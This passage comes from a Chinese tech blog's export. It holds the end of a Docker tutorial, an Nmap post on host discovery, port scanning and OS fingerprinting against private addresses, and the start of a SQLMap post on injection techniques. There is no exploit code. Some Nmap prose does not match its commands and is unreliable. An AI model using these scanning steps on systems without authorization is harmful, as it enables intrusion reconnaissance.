sudo apt-get update sudo apt-get install \    apt-transport-http \    ca-certificates \    curl \    gnupg \    lsb-release</code></pre><h5 id="第三步：添加Docker官方的GPG密钥"><a href="#第三步：添加Docker官方的GPG密钥" class="headerlink" title="第三步：添加Docker官方的GPG密钥"></a>第三步：添加Docker官方的GPG密钥</h5><pre><code class="shell">curl -fsSL http://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</code></pre><h5 id="第四步：设置镜像的仓库"><a href="#第四步：设置镜像的仓库" class="headerlink" title="第四步：设置镜像的仓库"></a>第四步：设置镜像的仓库</h5><pre><code class="shell">echo \  &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] http://download.docker.com/linux/ubuntu \  $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</code></pre><p><img src="http://img-blog.csdnimg.cn/85ece452d056439ab9b54ae3fa163041.png"><br>这里默认是从国外的，不推荐，推荐使用国内的。</p><pre><code class="shell">echo \  &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg]  http://mirrors.aliyun.com/docker-ce/linux/ubuntu\   $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</code></pre><h5 id="第五步：更新apt包索引"><a href="#第五步：更新apt包索引" class="headerlink" title="第五步：更新apt包索引"></a>第五步：更新apt包索引</h5><pre><code class="shell">sudo apt-get update</code></pre><h5 id="第六步：安装最新版本的Docker-Engine和containerd"><a href="#第六步：安装最新版本的Docker-Engine和containerd" class="headerlink" title="第六步：安装最新版本的Docker Engine和containerd"></a>第六步：安装最新版本的Docker Engine和containerd</h5><pre><code class="shell">sudo apt-get install docker-ce docker-ce-cli containerd.io # docker-ce 社区版 而ee是企业版</code></pre><p> 🆗，至此安装完成！如果 Docker 没启动的话，先启动一下。</p><pre><code class="powershell">sudo systemctl start docker</code></pre><h5 id="第七步：使用docker-version查看是否安装成功"><a href="#第七步：使用docker-version查看是否安装成功" class="headerlink" title="第七步：使用docker version查看是否安装成功"></a>第七步：使用docker version查看是否安装成功</h5><pre><code class="shell">sudo docker version</code></pre><p><img src="http://img-blog.csdnimg.cn/00e7dd874601456e9b8d6a00adf55659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>出现这个页面就是成功安装了！</p><h5 id="第九步：测试-hello-world"><a href="#第九步：测试-hello-world" class="headerlink" title="第九步：测试 hello-world"></a>第九步：测试 hello-world</h5><pre><code class="shell">sudo docker run hello-world</code></pre><p><img src="http://img-blog.csdnimg.cn/c2fca765a42b4aecab56409048fc1f95.png"><br>hello-world 第一次需要先下载。<br><img src="http://img-blog.csdnimg.cn/821e0adc87244051935fcfc71ca7bdf1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="最后：查看下载的镜像"><a href="#最后：查看下载的镜像" class="headerlink" title="最后：查看下载的镜像"></a>最后：查看下载的镜像</h5><pre><code class="shell">docker images</code></pre><p><img src="http://img-blog.csdnimg.cn/ed7a052f336947bd9677835294d07a9f.png"><br>🆗，都没什么问题！    　</p><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>1、卸载 Docker：</p><pre><code class="shell">#1.卸载 Docker Engine、CLI 和 Containerd 包：sudo apt-get purge docker-ce docker-ce-cli containerd.io#2. 删除所有镜像、容器和卷 //主机上的映像、容器、卷或自定义配置文件不会自动删除。sudo rm -rf /var/lib/docker # /var/lib/docker 是docker的默认工作路径！sudo rm -rf /var/lib/containerd</code></pre><p>2、阿里云镜像加速：</p><p>因为默认的 docker 仓库是国外的，所以这里把仓库改为aliyun的。<br><img src="http://img-blog.csdnimg.cn/84e6d47830924e8bb6309d17ebe2f607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>依次执行下面命令：</p><pre><code class="shell">sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#39;EOF&#39;&#123;  &quot;registry-mirrors&quot;: [&quot;http://j5l0vyp9.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><h4 id="四、Docker运行原理："><a href="#四、Docker运行原理：" class="headerlink" title="四、Docker运行原理："></a>四、Docker运行原理：</h4><h5 id="1、回顾-HelloWorld-流程："><a href="#1、回顾-HelloWorld-流程：" class="headerlink" title="1、回顾 HelloWorld 流程："></a>1、回顾 HelloWorld 流程：</h5><p><img src="http://img-blog.csdnimg.cn/c2fca765a42b4aecab56409048fc1f95.png"><br>run的流程图：<br><img src="http://img-blog.csdnimg.cn/f6503691cf6b40bca9ea3b2f7d3136d1.png"></p><h5 id="2、Docker是怎么工作的？"><a href="#2、Docker是怎么工作的？" class="headerlink" title="2、Docker是怎么工作的？"></a>2、Docker是怎么工作的？</h5><p>Docker是一个 C/S 结构的系统，Docker的守护进程运行在主机上。通过 Socket 从客户端访问。</p><p>Docker-Server 接收到 Docker-Client 的指令，就会执行这个命令。<br><img src="http://img-blog.csdnimg.cn/a676bacc5a044e4cb7c8eecbedd245a2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="3、Docker-为什么比-VM-快？"><a href="#3、Docker-为什么比-VM-快？" class="headerlink" title="3、Docker 为什么比 VM 快？"></a>3、Docker 为什么比 VM 快？</h5><p>1、Docker 有着比虚拟机更少的抽象层。由于 docker 不需要 Hypervisor 实现硬件资源虚拟化，运行在 docker 容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。</p><p>2、docker 利用的是宿主机的内核，vm 需要 Guest OS。</p><ul><li><p>GuestOS： VM（虚拟机）里的的系统（OS）</p></li><li><p>HostOS：物理机里的系统（OS）</p></li></ul><p><img src="http://img-blog.csdnimg.cn/31adf27f5acd4c50851716483c8afdf5.png"><br>因此，当新建一个容器时，docker 不需要和虚拟机一样重新加载一个操作系统内核。虚拟机加载 GuestOS，是分钟级别的。而 docker 直接利用宿主机的操作系统，省略了这个复杂的过程，因此新建一个 docker 容器只需要几秒钟。</p><h4 id="五、Docker的常用命令："><a href="#五、Docker的常用命令：" class="headerlink" title="五、Docker的常用命令："></a>五、Docker的常用命令：</h4><h5 id="1、帮助命令："><a href="#1、帮助命令：" class="headerlink" title="1、帮助命令："></a>1、帮助命令：</h5><pre><code class="shell">docker version #显示docker的版本信息。docker info #显示docker的系统信息，包括镜像和容器的数量docker 命令 --help #帮助命令</code></pre><p><a href="http://docs.docker.com/engine/reference/commandline/build/">帮助文档</a></p><h5 id="2、镜像命令："><a href="#2、镜像命令：" class="headerlink" title="2、镜像命令："></a>2、镜像命令：</h5><pre><code class="shell">docker images #查看所有本地主机上的镜像 可以使用 docker image ls代替docker search #搜索镜像docker pull #下载镜像 = docker image pulldocker rmi  #删除镜像 = docker image rm</code></pre><p><strong>docker images 查看所有本地主机上的镜像</strong>:<br><img src="http://img-blog.csdnimg.cn/94c0dcda06544c558848833bc6d5eb43.png"></p><pre><code class="shell">#可选项-a,--all    #列出所有镜像-q,--quiet  #只显示镜像的id</code></pre><p><strong>docker search 搜索镜像</strong>：<br><img src="http://img-blog.csdnimg.cn/977a8a185d434350bc10e6648e78ed3f.png"></p><pre><code class="shell">#可选项，通过收藏来过滤-f/--filter=STARS=3000 #搜索出来的镜像就是STARS大于3000的</code></pre><p><img src="http://img-blog.csdnimg.cn/bbedccfabe794cf9b1db0c1f56228b21.png"></p><p><strong>docker pull 下载镜像</strong>：</p><pre><code class="shell">#下载镜像 docker pull 镜像名smk@ubuntu:~$ sudo docker pull mysqlUsing default tag: latest #如果不写tag，默认就是latestlatest: Pulling from library/mysql 33847f680f63: Pull complete #分层下载： docker image 的核心 联合文件系统5cb67864e624: Pull complete 1a2b594783f5: Pull complete b30e406dd925: Pull complete 48901e306e4c: Pull complete 603d2b7147fd: Pull complete 802aa684c1c4: Pull complete 715d3c143a06: Pull complete 6978e1b7a511: Pull complete f0d78b0ac1be: Pull complete 35a94d251ed1: Pull complete 36f75719b1a9: Pull complete Digest: sha256:8b928a5117cf5c2238c7a09cd28c2e801ac98f91c3f8203a8938ae51f14700fd #签名 防伪Status: Downloaded newer image for mysql:latest docker.io/library/mysql:latest #真实地址#二者等价docker pull mysqldocker pull docker.io/library/mysql:latest</code></pre><p>指定版本下载：<br><img src="http://img-blog.csdnimg.cn/a46f587830fc483dae9199307cc7693f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><img src="http://img-blog.csdnimg.cn/729f04df57514626af1d44ca9151c65c.png"></p><p><strong>docker rmi 删除镜像</strong>：</p><pre><code class="powershell">docker rmi -f 镜像id #删除指定的镜像docker rmi -f 镜像id 镜像id 镜像id 镜像id #删除指定的镜像docker rmi -f $(docker images -aq) #删除全部的镜像</code></pre><p><img src="http://img-blog.csdnimg.cn/c1022cf408f74f3281e09a1046933e31.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>注意这里不是root用户，需要加 sudo</p><h5 id="3、容器命令："><a href="#3、容器命令：" class="headerlink" title="3、容器命令："></a>3、容器命令：</h5><p>说明：有了镜像才可以创建容器；先下载一个 centos 镜像来测试:</p><pre><code class="shell">docker pull centos</code></pre><p><strong>新建容器并启动</strong>（注意和 start 的区别，start 只能启动）：</p><pre><code class="shell">docker run [可选参数] 镜像名 #参数说明--name=&quot;Name&quot; 容器名字 tomcat01 tomcat02 用来区分容器-d 后台方式运行-it 使用交互方式运行（就是进入容器内）-p 指定容器的端口 -p 8080(宿主机):8080(容器)     #一共有四种用法：    -p ip:主机端口:容器端口    -p 主机端口:容器端口(常用)    -p 容器端口    容器端口-P(大写) 随机指定端口</code></pre><p>启动并进入容器：<br><img src="http://img-blog.csdnimg.cn/ebf28d2c0c4843c8b77a100a2e7b2a64.png"><br><code>/bin/bash</code>：即启动 bash类型的shell。</p><p><strong>退出容器</strong>：</p><pre><code class="shell">exit       #容器停止并退出ctrl +P +Q #容器不停止退出</code></pre><p><img src="http://img-blog.csdnimg.cn/4cdbf83f4bcd4b62bef047023f98c8fa.png"><br><strong>列出所有运行的容器</strong>：</p><pre><code class="shell">docker ps [可选参数] #列出当前正在运行的容器#参数说明-a #列出当前正在运行的容器 + 带出历史运行过的容器-n=? #显示最近创建的容器-q #只显示容器的编号</code></pre><p><img src="http://img-blog.csdnimg.cn/e024647ba8834fcab0ac45bafda8def2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>删除容器</strong>：</p><pre><code class="shell">docker rm 容器id #删除指定的容器，不能删除正在运行的容器，如果要强制删除 rm -fdocker rm -f $(docker ps -aq) #强制删除所有的容器docker ps -a -q|xargs docker rm #删除所有的容器</code></pre><p><img src="http://img-blog.csdnimg.cn/76f5e99e8c6a410f9a430e4d29c33845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>启动和停止容器</strong>：</p><pre><code class="shell">docker start 容器id #启动容器docker restart 容器id #重启容器docker stop 容器id #停止当前正在运行的容器docker kill 容器id #强制停止当前容器</code></pre><p><img src="http://img-blog.csdnimg.cn/1fb975e38e3148c4b4316b08e991f9d7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="4、常用其他命令："><a href="#4、常用其他命令：" class="headerlink" title="4、常用其他命令："></a>4、常用其他命令：</h5><p><strong>后台启动</strong>：</p><pre><code class="shell">docker run -d 镜像名</code></pre><p><img src="http://img-blog.csdnimg.cn/f87ddf38c5e94d0da6b44af4561064be.png"><br>一个小坑：</p><p>docker ps 发现 centos 停止了</p><p>原因是：docker容器使用后台运行，就必须要有要一个前台进程，docker 没有发现前台进程，就会自动停止。</p><p>常见：nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</p><p><strong>查看容器中进程信息</strong>：</p><pre><code class="shell">docker top 容器id</code></pre><p><img src="http://img-blog.csdnimg.cn/3038e38f1e394995bc7c1b8b62b04281.png"><br>注：必须是运行的容器。</p><p><strong>进入当前正在运行的容器</strong>：</p><pre><code class="shell"># 我们通常容器都是使用后台方式运行的，需要进入容器，修改一些配置# 命令:docker exec -it 容器id bashshell</code></pre><p><img src="http://img-blog.csdnimg.cn/8ae96442a0ec4fcbb1bf8be045b9c3a0.png"></p><pre><code class="shell"># 方式二docker attach 容器id</code></pre><p><img src="http://img-blog.csdnimg.cn/48bfc789136341d5a1475c6fe5f9dcc1.png"></p><pre><code class="shell">#区别docker exec #进入当前容器后开启一个新的终端，可以在里面操作。（常用）docker attach # 进入容器正在执行的终端</code></pre><p><strong>从容器内拷贝到主机上</strong>:</p><pre><code class="shell">docker cp 容器id:容器内路径 主机目的路径</code></pre><p>例：<br><img src="http://img-blog.csdnimg.cn/5c807bdce7dc44cfa1ba652cbe7fab67.png"></p><h5 id="5、Docker可视化："><a href="#5、Docker可视化：" class="headerlink" title="5、Docker可视化："></a>5、Docker可视化：</h5><p><strong>portainer</strong> 是 docker 图形化界面管理工具！提供一个后台面板供我们操作！（不建议使用）</p><pre><code class="shell">#官网查找安装命令docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce</code></pre><p>访问：<br><img src="http://img-blog.csdnimg.cn/5876335f92444045ab302a19a6c97542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>进来之后就是这样。<br><img src="http://img-blog.csdnimg.cn/de395335cecf4d50b24d61960648e0c5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>可以看到一些本地docker的配置<br><img src="http://img-blog.csdnimg.cn/ed27559e4bde4f1da988d8e20b4e1ada.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h4 id="六、Docker镜像讲解："><a href="#六、Docker镜像讲解：" class="headerlink" title="六、Docker镜像讲解："></a>六、Docker镜像讲解：</h4><h5 id="1、Docker镜像加载原理："><a href="#1、Docker镜像加载原理：" class="headerlink" title="1、Docker镜像加载原理："></a>1、Docker镜像加载原理：</h5><ul><li>docker 的镜像实际上由一层一层的文件系统组成，这种层级的文件系统 UnionFS（下载的时候看到一层层的下载就是这个） 。</li></ul><blockquote><p>UnionFs (联合文件系统)：</p><p>UnionFs 是Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p></blockquote><ul><li><p>bootfs(boot file system)：主要包含 bootloader 和 Kernel(内核)，bootloader 主要是引导加载 kernel，Linux 刚启动时会加 bootfs 文件系统，在 Docker 镜像的最底层是 bootfs。这一层与我们典型的 Linux/Unix 系统是一样的，包含 boot加载器和内核。当 boot 加载完成之后整个内核就都在内存中了，此时内存的使用权已由 bootfs 转交给内核，此时系统也会卸载 bootfs。</p></li><li><p>rootfs(root file system)，在 bootfs 之上。包含的就是典型  Linux 系统中的 <code>/dev,/proc,/bin,/etc</code> 等标准目录和文件。 rootfs 就是各种不同的操作系统发行版，比如 Ubuntu,Centos 等等。<br><img src="http://img-blog.csdnimg.cn/eafbd6bf9f3241818536f16c3df06d97.png"></p></li></ul><p>平时安装的虚拟机的 CentOS 都是好几个G，为什么 Docker 这里才200M？</p><ul><li><p>对于个精简的OS，rootfs 可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用 Host(主机) 的 kernel，自己只需要提供 rootfs 就可以了。由此可见对于不同的 Linux 发行版， bootfs 基本是一致的， rootfs 会有差別，因此不同的发行版可以公用 bootfs.</p><h5 id="2、分层理解"><a href="#2、分层理解" class="headerlink" title="2、分层理解:"></a>2、分层理解:</h5><p><img src="http://img-blog.csdnimg.cn/933e454ea9524606883771086d62e780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>思考：为什么Docker镜像要采用这种分层的结构呢？</p></li><li><p>最大的好处：资源共享，比如有多个镜像都从相同的 Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，而且镜像的每一层都可以被共享。</p></li></ul><p>例如：当系统中已经有了 CentOS 镜像，那么后面再有用到 CentOS 镜像的就不用再下载一次了。</p><p>查看镜像分层的方式可以通过<code>docker image inspect</code> 命令:<br><img src="http://img-blog.csdnimg.cn/60a5cfbc4f90409bb5e72170e65f8aff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="3、Commit-镜像："><a href="#3、Commit-镜像：" class="headerlink" title="3、Commit 镜像："></a>3、Commit 镜像：</h5><p>Docker 镜像都是只读的，当容器启动时，一个新的可写层加载到镜像的顶部。</p><p>这一层就是我们通常说的容器层，容器之下的都叫镜像层！<br><img src="http://img-blog.csdnimg.cn/f1e35124d036442cafe12a877e5f95be.png"><br>如果想要保存当前容器的状态，就可以通过 commit 来提交，获得一个镜像，就好比使用虚拟机的快照。</p><p>命令：</p><pre><code class="shell">docker commit -m=&quot;描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[TAG]</code></pre><p><strong>实战测试</strong>：</p><p>1、启动一个tomcat</p><pre><code class="shell">docker run -d -p 8080:8080 tomcat:9.0</code></pre><p>2、发现这个默认的 tomcat 是没有 webapps 应用</p><pre><code class="shell">docker exec -it 容器id</code></pre><p> 3、自己拷贝文件进去</p><pre><code class="shell">cp -r webapps.dist/* webapps</code></pre><p> 4、将操作过的容器通过 commit 提交为一个镜像</p><pre><code class="powershell">docker commit -a=&quot;smk&quot; -m=&quot;add webapps&quot; 容器id tomcat02:1.0</code></pre><p><img src="http://img-blog.csdnimg.cn/0cc311cfa4764e2d98bc8473fe4d7013.png"><br>这样以后就可以使用我们修改过的镜像了，这就是我们自己的一个修改的镜像。</p><hr>🆗，至此 docker入门成功！]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap使用详解</title>
      <link href="2021/03/02/Nmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>2021/03/02/Nmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>今天来总结一下Nmap注入神器的详细使用方法。<hr></p><h4 id="一、Nmap介绍"><a href="#一、Nmap介绍" class="headerlink" title="一、Nmap介绍"></a>一、Nmap介绍</h4><p><img src="https://img-blog.csdnimg.cn/20210225160534331.png">Nmap(Network Mapper，网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap。</p><h5 id="1、Nmap的特点如下："><a href="#1、Nmap的特点如下：" class="headerlink" title="1、Nmap的特点如下："></a>1、Nmap的特点如下：</h5><ul><li><p>主机探测：探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</p></li><li><p>端口扫描：探测目标主机所开放的端口。</p></li><li><p>版本检测：探测目标主机的网络服务，判断其服务名称及版本号。</p></li><li><p>系统检测:探测目标主机的操作系统及网络设备的硬件特性。</p></li><li><p>支持探测脚本的编写:使用Nmap的脚本引擎(NSE)和Lua编程语言。</p></li></ul><h4 id="二、安装Nmap"><a href="#二、安装Nmap" class="headerlink" title="二、安装Nmap"></a>二、安装Nmap</h4><p>Windows中Nmap下载地址：<a href="https://nmap.org/download.html">https://nmap.org/download.html</a><img src="https://img-blog.csdnimg.cn/20210225162039690.png"><br>在安装的过程中按照提示一步步进行即可<br><img src="https://img-blog.csdnimg.cn/20210225162723148.png"><br>安装完成后可以直接通过命令行使用<br><img src="https://img-blog.csdnimg.cn/20210225164014744.png"></p><h4 id="三、Nmap常用方法"><a href="#三、Nmap常用方法" class="headerlink" title="三、Nmap常用方法"></a>三、Nmap常用方法</h4><p>Nmap的参数较多，但是通常用不了那么多，以下是在渗透测试过程中比较常见的命令。</p><h5 id="1、扫描单个目标地址："><a href="#1、扫描单个目标地址：" class="headerlink" title="1、扫描单个目标地址："></a>1、扫描单个目标地址：</h5><p>在Nmap后面直接添加目标地址即可扫描，如下所示：</p><pre><code class="python">nmap 192.168.0.100</code></pre><p><img src="https://img-blog.csdnimg.cn/2021022821521149.png" alt="在这里插入图片描述"></p><h5 id="2、扫描多个目标地址："><a href="#2、扫描多个目标地址：" class="headerlink" title="2、扫描多个目标地址："></a>2、扫描多个目标地址：</h5><p>如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描，如下所示：</p><pre><code class="python">nmap 192.168.0.1 192.168.0.6</code></pre><p><img src="https://img-blog.csdnimg.cn/2021022822003825.png" alt="在这里插入图片描述"></p><h5 id="3、扫描一个范围内的目标地址："><a href="#3、扫描一个范围内的目标地址：" class="headerlink" title="3、扫描一个范围内的目标地址："></a>3、扫描一个范围内的目标地址：</h5><p>可以指定扫描一个连续的网段，中间使用“-”连接，例如，下列命令表示扫描范围为192.168.0.100~192.168.0.110，如下所示：</p><pre><code class="python">nmap 192.168.0.1-6</code></pre><p><img src="https://img-blog.csdnimg.cn/20210228220838312.png" alt="在这里插入图片描述"></p><h5 id="4、扫描目标地址所在的某个网段："><a href="#4、扫描目标地址所在的某个网段：" class="headerlink" title="4、扫描目标地址所在的某个网段："></a>4、扫描目标地址所在的某个网段：</h5><p>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为192.168.0.1～192.168.0.255，如下所示：</p><pre><code class="python">nmap 192.168.0.100/24</code></pre><p><img src="https://img-blog.csdnimg.cn/20210228221059968.png" alt="在这里插入图片描述"></p><h5 id="5、扫描主机列表targets-txt中的所有目标地址："><a href="#5、扫描主机列表targets-txt中的所有目标地址：" class="headerlink" title="5、扫描主机列表targets.txt中的所有目标地址："></a>5、扫描主机列表targets.txt中的所有目标地址：</h5><p>扫描 targets.txt 中的地址或者网段，此处导入的是绝对路径，如果 targets.txt 文件与 nmap.exe 在同一个目录下，则直接引用文件名即可，如下所示：</p><pre><code class="bash">nmap -iL C:\Users\smk\Desktop\targets.txt</code></pre><p><img src="https://img-blog.csdnimg.cn/20210228222647502.png" alt="在这里插入图片描述"></p><h5 id="6、扫描除某一个目标地址之外的所有目标地址："><a href="#6、扫描除某一个目标地址之外的所有目标地址：" class="headerlink" title="6、扫描除某一个目标地址之外的所有目标地址："></a>6、扫描除某一个目标地址之外的所有目标地址：</h5><p>下列命令表示扫描除192.168.0.105之外的其他192.168.0.x地址，从扫描结果来看确实没有对192.168.0.105进行扫描，如下所示：</p><pre><code class="python">nmap 192.168.0.100/24 -exclude 192.168.0.1</code></pre><p><img src="https://img-blog.csdnimg.cn/20210228223048405.png" alt="在这里插入图片描述"></p><h5 id="7、扫描除某一文件中的目标地址之外的目标地址："><a href="#7、扫描除某一文件中的目标地址之外的目标地址：" class="headerlink" title="7、扫描除某一文件中的目标地址之外的目标地址："></a>7、扫描除某一文件中的目标地址之外的目标地址：</h5><p>下列命令表示扫描除了target.txt文件夹中涉及的地址或网段之外的目标地址。还是以扫描192.168.0.x网段为例，在targets.txt中添加192.168.0.100和192.168.0.105，从扫描结果来看已经证实该方法有效可用，如下所示：</p><pre><code class="python">nmap 192.168.0.100/24 -excludefile C:\Users\smk\Desktop\targets.txt</code></pre><p><img src="https://img-blog.csdnimg.cn/20210228223717135.png" alt="在这里插入图片描述"></p><h5 id="8、扫描某一目标地址的21、22、23、80端口："><a href="#8、扫描某一目标地址的21、22、23、80端口：" class="headerlink" title="8、扫描某一目标地址的21、22、23、80端口："></a>8、扫描某一目标地址的21、22、23、80端口：</h5><p>如果不需要对目标主机进行全端口扫描，只想探测它是否开放了某一端口，那么使用-p参数指定端口号，将大大提升扫描速度，如下所示：</p><pre><code class="python">nmap 192.168.0.6 -p 135,443,445</code></pre><p><img src="https://img-blog.csdnimg.cn/20210228231610466.png" alt="在这里插入图片描述"> </p><h5 id="9、对目标地址进行路由跟踪："><a href="#9、对目标地址进行路由跟踪：" class="headerlink" title="9、对目标地址进行路由跟踪："></a>9、对目标地址进行路由跟踪：</h5><p>下列命令表示对目标地址进行路由跟踪，如下所示：</p><pre><code class="python">nmap --traceroute 192.168.0.6</code></pre><h5 id="10、扫描目标地址所在C段的在线状况："><a href="#10、扫描目标地址所在C段的在线状况：" class="headerlink" title="10、扫描目标地址所在C段的在线状况："></a>10、扫描目标地址所在C段的在线状况：</h5><p>下列命令表示扫描目标地址所在C段的在线状况，如下所示：</p><pre><code class="python">nmap -sP 192.168.0.100/24</code></pre><p><img src="https://img-blog.csdnimg.cn/20210301001240550.png" alt="在这里插入图片描述"></p><h5 id="11、目标地址的操作系统指纹识别："><a href="#11、目标地址的操作系统指纹识别：" class="headerlink" title="11、目标地址的操作系统指纹识别："></a>11、目标地址的操作系统指纹识别：</h5><p>下列命令表示通过指纹识别技术识别目标地址的操作系统的版本，如下所示：</p><pre><code class="python">nmap -O 192.168.0.6</code></pre><p><img src="https://img-blog.csdnimg.cn/20210301001440818.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap使用详解</title>
      <link href="2021/02/19/SQLMap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>2021/02/19/SQLMap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>今天来总结一下sqlmap注入神器的详细使用方法。<hr></p><h4 id="一、SQLMap介绍"><a href="#一、SQLMap介绍" class="headerlink" title="一、SQLMap介绍"></a>一、SQLMap介绍</h4><h5 id="1、Sqlmap简介："><a href="#1、Sqlmap简介：" class="headerlink" title="1、Sqlmap简介："></a>1、Sqlmap简介：</h5><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</p><h5 id="2、Sqlmap支持的注入方式："><a href="#2、Sqlmap支持的注入方式：" class="headerlink" title="2、Sqlmap支持的注入方式："></a>2、Sqlmap支持的注入方式：</h5><p>Sqlmap全面支持六种SQL注入技术：</p><ul><li><p>基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。</p></li><li><p>基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</p></li><li><p>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</p></li><li><p>联合查询注入：在可以使用Union的情况下的注入。</p></li><li><p>堆查询注入：可以同时执行多条语句时的注入。</p></li><li><p>带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。</p></li></ul><h5 id="3、Sqlmap输出级别："><a href="#3、Sqlmap输出级别：" class="headerlink" title="3、Sqlmap输出级别："></a>3、Sqlmap输出级别：</h5><p>使用 Sqlmap 对一个注入点进行测试时，可以使用 <code>-v x</code> 